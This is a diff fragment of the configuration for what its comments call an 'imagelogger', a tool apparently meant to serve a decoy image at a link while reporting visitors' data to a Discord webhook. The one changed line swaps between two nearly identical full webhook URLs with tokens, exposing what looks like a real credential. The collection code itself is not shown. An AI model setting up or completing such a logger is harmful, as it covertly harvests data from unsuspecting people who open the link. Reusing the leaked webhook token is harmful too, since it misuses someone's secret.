@@ -13,7 +13,7 @@ __author__ = "yukii"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1453186961002074154/Wqoi2yww0-mmv2ULRVHBLGiPK9kJqpvGe5PNfDUZGEaW2nr1KW1uqX7mH3JMwcAoZQqf",
+    "webhook": "https://discord.com/api/webhooks/1453186961002074154/Wqoi2yww0-mmv2ULRVHBLGiPK9kJqpvGe5PNfDUZGEaW2nr1KW1uqX7mH3JMwcAoZQq",
     "image": "https://www.clamart.fr/sites/default/files/ACTUALITE/2021/02%20-%20FEVRIER/morpion%20%C3%A0%20imprimer%20-%20ludotheque.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
